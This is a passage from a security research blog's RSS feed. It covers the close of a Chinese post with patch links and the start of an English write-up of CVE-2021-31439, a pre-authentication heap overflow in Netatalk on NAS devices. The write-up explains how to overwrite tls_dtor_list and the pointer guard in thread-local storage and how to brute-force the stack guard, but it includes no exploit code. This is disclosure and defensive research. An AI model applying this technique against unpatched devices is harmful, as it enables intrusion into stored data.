&lt;p&gt;ÊàëÂÄëÂæå‰æÜ‰πüÂæû shodan ‰∏äÁôºÁèæÔºåÂÖ∂ÂØ¶‰πüÊúâÈùûÂ∏∏Â§ö‰∫∫Â∞á netatalk ÈñãÂú®Â§ñÁ∂≤ÔºåÂÖâÂú® shodan ‰∏äÂ∞±Êúâ 13 Ëê¨Âè∞Ê©üÂô®ÔºåÂÖ∂‰∏≠Â§ßÈÉ®ÂàÜÊòØ Synology„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;ÁõÆÂâç‰∏äËø∞‰∏âÂè∞ÁöÜÂ∑≤‰øÆË£úÔºåË´ãÂ∞öÊú™Êõ¥Êñ∞ÁöÑÁî®Êà∂Êõ¥Êñ∞Âà∞ÊúÄÊñ∞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Synology
    &lt;ul&gt;
      &lt;li&gt;https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;QNAP
    &lt;ul&gt;
      &lt;li&gt;https://www.qnap.com/en/security-advisory/qsa-21-50&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Asustor
    &lt;ul&gt;
      &lt;li&gt;https://www.asustor.com/service/release_notes#ADM%203.5.7.RKU2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ë©≤ÊºèÊ¥û‰πüÂú®ËøëÊúüÈáãÂá∫ÁöÑ &lt;a href=&quot;https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html&quot;&gt;Netatalk 3.1.13&lt;/a&gt; ÁâàÊú¨‰∏≠‰øÆÂæ©ÔºåÂ¶ÇÊúâ‰ΩøÁî®Âà∞ Netatalk 3.1.13 ‰ª•ÂâçÁâàÊú¨Ôºå‰πüË´ãÂãôÂøÖÊõ¥Êñ∞„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;disable-afp&quot;&gt;Disable AFP&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Ê≤í‰ΩøÁî® AFP ÊôÇÔºåÊúÄÂ•ΩÁõ¥Êé•ÈóúÊéâÊàñÂè™ÈôêÂà∂Âú®ÂÖßÁ∂≤Â≠òÂèñ„ÄÇË©≤ project Âπæ‰πéÂ∑≤Á∂ìÂæàÂ∞ëÁ∂≠Ë≠∑ÔºåÁπºÁ∫å‰ΩøÁî®È¢®Èö™Ê•µÈ´ò„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊîπÁî® SMB &lt;strong&gt;Áõ∏Â∞çÂÆâÂÖ®&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Â¶ÇÊûúÊÉ≥Ë¶ÅÁî®È°û‰ººÂäüËÉΩÔºåÂª∫Ë≠∞ÂèØ‰ΩøÁî® SMB Áõ∏Â∞çÂÆâÂÖ®‰∏çÂ∞ëÔºå‰ΩÜÂè™ËÉΩË™™Áõ∏Â∞çÂÆâÂÖ®Ôºå‰∏çËÉΩË™™ÁµïÂ∞çÊ≤íÂïèÈ°åÔºåÂª∫Ë≠∞ÈÇÑÊòØÂ∞áÁõ∏ÈóúÊúçÂãôÈÉΩÈñãÂú®ÂÖßÁ∂≤Â∞±Â•ΩÔºåÊ≤íÁî®Âà∞ÁöÑËÉΩÈóúÂ∞±Èóú&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;ÊàëÂÄëÂ∑≤ÊàêÂäüÂú® NAS ‰∏≠ÊâæÂà∞‰∏ÄÂÄãÂö¥ÈáçÊºèÊ¥ûÔºå‰∏¶‰∏îÊàêÂäüÂØ´Âá∫Ê¶ÇÂøµË≠âÊòéÁ®ãÂºèÔºåË≠âÂØ¶ÂèØ‰ª•Âà©Áî®Âú® Synology„ÄÅQNAP Âèä Asustor Á≠â‰∏ªÊµÅ NAS ‰∏äÂà©Áî®„ÄÇÊàëÂÄë‰πüË™çÁÇ∫ Netatalk ÊòØÂú® NAS ‰∏≠Êñ∞‰∏Ä‰ª£ÁöÑÂæåÈñÄ!&lt;/p&gt;

&lt;p&gt;Êú™‰æÜÂ∏åÊúõÊúâ‰ΩøÁî®Âà∞Á¨¨‰∏âÊñπÂ•ó‰ª∂ÁöÑ NAS Âª†ÂïÜÔºåÂèØ‰ª•Â§öÈáçÊñ∞ÂØ©Ë¶ñ‰∏Ä‰∏ãÁ¨¨‰∏âÊñπÂ•ó‰ª∂ÊâÄÂ∏∂‰æÜÁöÑÂÆâÂÖ®ÊÄßÂïèÈ°åÔºåÂº∑ÁÉàÂª∫Ë≠∞ÂèØ‰ª•Ëá™Ë°å Review ‰∏ÄÊ¨°Ôºå‰∏¶‰∏îÊ≥®ÊÑèÂÖ∂‰ªñÂª†ÂïÜÊòØÂê¶‰πüÊúâ‰øÆÂæ©ÂêåÊ®£Â•ó‰ª∂‰∏äÁöÑÊºèÊ¥ûÔºåÂæàÊúâÂèØËÉΩËá™Â∑±‰πüÊúÉÂèóÂà∞ÂΩ±ÈüøÔºå‰πüÂ∏åÊúõ‰ΩøÁî® NAS ÁöÑÁî®Êà∂Ôºå‰πüËÉΩÂ§öÂ§öÈáçË¶ñ‰∏çË¶ÅÊää NAS ÈñãÂú®Â§ñÁ∂≤ÔºåËÉΩÈóúÁöÑÊúçÂãôÂ∞±Áõ°ÂèØËÉΩÈóúÈñâÔºå‰ª•Ê∏õÂ∞ëÊîªÊìäÈù¢ÔºåËÆìÊîªÊìäËÄÖÊúâÊ©üÂèØË∂Å„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;‰∫ãÂØ¶‰∏äÔºåÊàëÂÄë‰∏¶‰∏çÂè™ÊúâÊâæÂà∞‰∏ÄÂÄãÊºèÊ¥ûÔºåÊàëÂÄë‰πüÁôºÁèæÈÇÑÊúâ‰∏çÂ∞ëÂïèÈ°åÔºå‰πüÈÅãÁî®Âú®ÂéªÂπ¥ÁöÑ Pwn2Own Austin ‰∏äÔºåÈÄôÈÉ®ÂàÜÊàëÂÄëÂú®Â§ßÈÉ®ÂàÜÂª†ÂïÜ‰øÆÂæ©ÂæåÊúÉÂú®ÂÖ¨ÈñãÂÖ∂‰ªñÁöÑÁ†îÁ©∂ÔºåÂ∞±Êï¨Ë´ãÊúüÂæÖ Part II„ÄÇ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS/</link>
                <guid>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS</guid>
                <pubDate>Mon, 28 Mar 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your NAS is not your NAS !</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Two years ago, we found a &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-492/&quot;&gt;critical vulnerability&lt;/a&gt;, CVE-2021-31439, on Synology NAS. This vulnerability can let an unauthorized attacker gain code execution on remote Synology DiskStation NAS server. We used this vulnerability to exploit Synology DS418play NAS in Pwn2Own Tokyo 2020. After that, we found the vulnerability is not only exists on Synology but also on most NAS vendors. Following we will describe the details and how we exploit it.&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;https://hitcon.org/2021/en&quot;&gt;HITCON 2021&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2021/agenda/03f06675-261d-4c97-b524-33ef9cc6ccb2/%E4%BD%A0%E7%9A%84%20NAS%20%E4%B8%8D%E6%98%AF%E4%BD%A0%E7%9A%84%20NAS%20!.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;network-attached-storage&quot;&gt;Network Attached Storage&lt;/h2&gt;

&lt;p&gt;In the early days, NAS was generally used to separate the server and data and also used for backup. It was mainly used to allow users to directly access data and share files on the Internet. In modern times, NAS provides not only file sharing but also various services. In this era of Internet of Things, there will be more people combining NAS and home assistants to make life more convenient.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;why-do-we-want-to-research-nas&quot;&gt;Why do we want to research NAS?&lt;/h3&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;
&lt;p&gt;While we were doing red team assessment, we found that NAS generally appeared in the corporate intranet, or sometimes even exposed to the external network. They usually stored a lot of corporate confidential information on the NAS. Therefore, NAS gradually attracted our attention, and its Strategic Value has been much higher than before.&lt;/p&gt;

&lt;h4 id=&quot;ransomware&quot;&gt;Ransomware&lt;/h4&gt;
&lt;p&gt;NAS has become more and more popular in recent years. More and more people store important data on NAS. It makes NAS a target of ransomware. At the beginning of last year, NAS vulnerabilities led to outbreak of locker event. We hope to reduce the recurrence of similar things, thereby increasing the priority of NAS research to improve NAS security.&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-mobile-2020&quot;&gt;Pwn2Own Mobile 2020&lt;/h4&gt;
&lt;p&gt;The last reason is that NAS has become one of the main targets of Pwn2Own Mobile since 2020. We also wanted to try to join Pwn2Pwn event, so we decided to make NAS as the primary goal of the research at that time. Because of Synology is the most popular device in Taiwan, we decided start from it.&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;DS918+&lt;/li&gt;
  &lt;li&gt;DSM 6.2.3-25426&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our test environment is Synology DS918+. It very similar as DS418 play(target of Pwn2Own Tokyo 2020). In order to better meet the environment that we usually encounter and the requirements in Pwn2Own, it will be in the state of all default settings.&lt;/p&gt;

&lt;h3 id=&quot;attack-surface&quot;&gt;Attack surface&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First of all, we can use netstat to find which port is open. We can see that in the default environment, many services are opened, such as smb/nginx/afpd.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In UDP, it has minissdpd/findhost/snmpd, etc., most of protocols help to find devices.&lt;/p&gt;

&lt;p&gt;We selected a few services for preliminary analysis.&lt;/p&gt;

&lt;h4 id=&quot;dsm-web-interface&quot;&gt;DSM Web interface&lt;/h4&gt;
&lt;p&gt;The first one is the DSM Web interface. This part is probably the one that most people analyze and it has obvious entry points. Many years ago, there were many command injection vulnerabilities, but after that Synology set strict specifications. There are almost no similar problems nowadays.&lt;/p&gt;

&lt;h4 id=&quot;smb&quot;&gt;SMB&lt;/h4&gt;
&lt;p&gt;The SMB protocol in Synology is based on &lt;a href=&quot;https://www.samba.org/&quot;&gt;Samba&lt;/a&gt;. Due to the large number of user, many researcher are doing code review on it. Therefore, there are many vulnerabilities found in Samba every year. The most famous vulnerability recently is &lt;a href=&quot;https://www.samba.org/samba/security/CVE-2017-7494.html&quot;&gt;SambaCry&lt;/a&gt;. But because more people are reviewing, it is relatively safer than other services.&lt;/p&gt;

&lt;h4 id=&quot;iscsi-manager&quot;&gt;iSCSI Manager&lt;/h4&gt;
&lt;p&gt;It mainly helps users manage and monitor iSCSI services and it is developed by Synology itself. There are a lot of vulnerabilities in iSCSI recently. Maybe it will be a good target. If there is no other attack surface, we might analyze it first.&lt;/p&gt;

&lt;h4 id=&quot;netatalk&quot;&gt;Netatalk&lt;/h4&gt;
&lt;p&gt;The last one is Netatalk, which is known as afp protocol. Netatalk in Synology is based on &lt;a href=&quot;http://netatalk.sourceforge.net/&quot;&gt;Netatak&lt;/a&gt; 3.1.8. The most critical vulnerability recently is CVE-2018-1160. For this vulnerability, please refer to &lt;a href=&quot;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&quot;&gt;Exploiting an 18 Year Old Bug&lt;/a&gt;. Compared with other services, Netatalk has very few vulnerabilities in the past. It is less noticed, and it has not been updated and maintained for a long time.&lt;/p&gt;

&lt;p&gt;After overall analysis, we believe that Netatalk is the most vulnerable point in Synology. We finally decided to analyze it first. In fact, there are other services and attack surfaces, but we didn‚Äôt spend much time on other service. We will only focus on Netatalk in this article.&lt;/p&gt;

&lt;h2 id=&quot;netatalk-1&quot;&gt;Netatalk&lt;/h2&gt;
&lt;p&gt;Apple Filing Protocol (AFP) is a file transfer protocol similar to SMB. It is used to transfer and share files on MAC. Because Apple itself is not open-sourced, in order to utilize AFP on Unix-like systems, Netatalk is created. Netatalk is a freely-available Open Source AFP fileserver. Almost every NAS uses it to make file sharing on MAC more convenient.&lt;/p&gt;

&lt;h3 id=&quot;netatalk-in-synology&quot;&gt;Netatalk in Synology&lt;/h3&gt;

&lt;p&gt;The netatalk in Synology is enabled by default. The version is modified from netatalk 3.1.8, and it tracks security updates regularly. Once installed, you can use the AFP protocol to share files with Synology NAS. It also enables protections such as ASLR, NX and StackGuard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dsi&quot;&gt;DSI&lt;/h4&gt;
&lt;p&gt;Before we look into the detail of the vulnerability we need to talk about Data Stream Interface (DSI). The DSI is a session layer format used to carry AFP traffic over TCP. While server and client communicate through the AFP, a DSI header is in front of each packet.&lt;/p&gt;

&lt;p&gt;DSI Packet Header :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The content of the DSI packet is shown as the figure above. It contains metadata and payload, which generally follows the DSI header and payload format.&lt;/p&gt;

&lt;p&gt;AFP over DSI :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The communication of the AFP protocol is shown above. The client first gets the server information to determine available authentication methods, the version used, and so on. Then it opens a new session and to execute AFP commands. Without authentication, we can only do related operations such as login and logout. Once the client is verified, we can do file operations like SMB.&lt;/p&gt;

&lt;p&gt;In Netatalk implementation, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_block&lt;/code&gt; will be used as the packet structure.&lt;/p&gt;

&lt;p&gt;dsi_block :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dsi_flag means that the packet is a request or reply&lt;/li&gt;
  &lt;li&gt;dsi_command indicates what our request does
    &lt;ul&gt;
      &lt;li&gt;DSICloseSession&lt;/li&gt;
      &lt;li&gt;DSICommand&lt;/li&gt;
      &lt;li&gt;DSIGetStatus&lt;/li&gt;
      &lt;li&gt;DSIOpenSession&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_code
    &lt;ul&gt;
      &lt;li&gt;Error code&lt;/li&gt;
      &lt;li&gt;For reply&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_doff
    &lt;ul&gt;
      &lt;li&gt;DSI data offset&lt;/li&gt;
      &lt;li&gt;Using in DSIWrite&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_len
    &lt;ul&gt;
      &lt;li&gt;The Length of Payload&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DSI : A descriptor of dsi stream&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Netatalk, most of the information are stored in a structure called DSI for subsequent operations after parsing the packet and configuration files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_quantum&lt;/code&gt; and payload content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The payload of the packet is stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command&lt;/code&gt; buffer in the DSI structure. The buffer size is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_quantum&lt;/code&gt;, and the value is specified in the afp configuration file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;afp.conf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If not specified, it uses the default size(0x100000).&lt;/p&gt;

&lt;p&gt;With a preliminary understanding, let‚Äôs talk about this vulnerability.&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability we found occurs while receiving the payload. It can be triggered without authentication. The vulnerable function is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It‚Äôs the function that parses the information from received packet and puts it into the DSI structure. When it receives the packet data, it first determine how much data to read into the command buffer according to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_len&lt;/code&gt; in the dsi header. At the beginning, the size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_cmdlen&lt;/code&gt; is verified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, as shown in the picture above, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; is provided by user, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; is used as the length. There is no verification here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The default length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; is 0x100000(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;server_quantum&lt;/code&gt;), which is a fixed length allocated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_init&lt;/code&gt;, so as long as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;header.dsi_doff&lt;/code&gt; is larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;server_quantum&lt;/code&gt;, heap overflow occurs.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;In DSM 6.2.3, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; buffer is allocated by malloc at libc 2.20. When it allocates more than 0x20000, malloc calls mmap to allocate memory. The memory layout of afpd after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_init&lt;/code&gt; is as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the below of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; is Thread Local Storage, which is used to store thread local variables of the main thread.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because of this memory layout, we can use the vulnerability to overwrite the data on Thread Local Storage. What variables to be overwritten in the Thread Local Storage?&lt;/p&gt;

&lt;h4 id=&quot;thread-local-storage&quot;&gt;Thread-local Storage&lt;/h4&gt;
&lt;p&gt;Thread-local Storage (TLS) is used to store the local variables of the thread. Each thread have its own TLS, which allocated when the Thread is created. It will be released when thread is destroyed. We can use heap overflow vulnerabilities to overwrite most of the variables stored in TLS.&lt;/p&gt;

&lt;h4 id=&quot;target-in-tls&quot;&gt;Target in TLS&lt;/h4&gt;
&lt;p&gt;In fact, there are many variables that can control RIP on TLS. Here are a few more common ones.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;We can forge main_arena to achieve arbitrary writing, but it‚Äôs more complicated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pointer_guard&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;We can modify the pointer guard to change the function pointer, but it requires a leak.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;It‚Äôs more suitable for our current situation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;overwrite-tls_dtor_list&quot;&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;We can use the &lt;a href=&quot;https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;technique&lt;/a&gt; used by project zero in 2014 to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;, and then control the RIP in exit().&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dtor_func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; is a singly linked list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; objects. It is mainly a destructor for thread local storage. In the end of the thread execution, it calls destructor function pointer in the linked list. We can overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; we forged.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the process exits, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_tls_dtors()&lt;/code&gt;. This function takes the object in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; and calls each destructor. At this time, if we can control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;, it calls the function we specified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, in the new version of glibc, the function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; is protected by pointer guard. So we need to know the value of pointer guard before we overwrite it. The pointer guard is initialized at the beginning of the program and is an unpredictable random number. If we don‚Äôt have information leakage, it‚Äôs hard to know the value.&lt;/p&gt;

&lt;p&gt;But in fact pointer guard would also be placed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;, there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; structure below the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;, which is the thread descriptor of main thread.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; structure is used to store various information about the thread such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack_guard&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pointer_guard&lt;/code&gt; used by the thread. In x86-64 Linux system, the fs register always points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; of the current thread, so the program access thread local storage by using fs register. The memory layout of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread local storage&lt;/code&gt; is shown as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use the vulnerability to overwrite not only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; but also pointer guard in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt;. In this way, we can overwrite it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; to solve the pointer guard problem mentioned earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But another problem appears, after we overwrite pointer guard, stack guard will also be overwritten.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before netatalk receives data, it first puts the original stack guard on the stack, and then invoke recv() to receive data to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;command&lt;/code&gt;. At this time, the buffer overflow occurs and cause stack guard and pointer guard to be overwritten. After this, netatalk returns to normal execution flow. It takes the stack guard from the stack and compare it with the stack guard in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt;. However, it has been overwritten by us, the comparison here fails, causing abort to terminate the program.&lt;/p&gt;

&lt;h4 id=&quot;bypass-stack-guard&quot;&gt;Bypass stack guard&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the netatalk(afpd) architecture, each connection forks a new process to handle the user‚Äôs request, so the memory address and stack guard of each connection are the same as the parent process. Because of this behavior, we can use brute-force bytes one by one to leak stack guard.&lt;/p&gt;

&lt;h4 id=&quot;brute-force-stack-guard&quot;&gt;Brute-force stack guard&lt;/h4&gt;

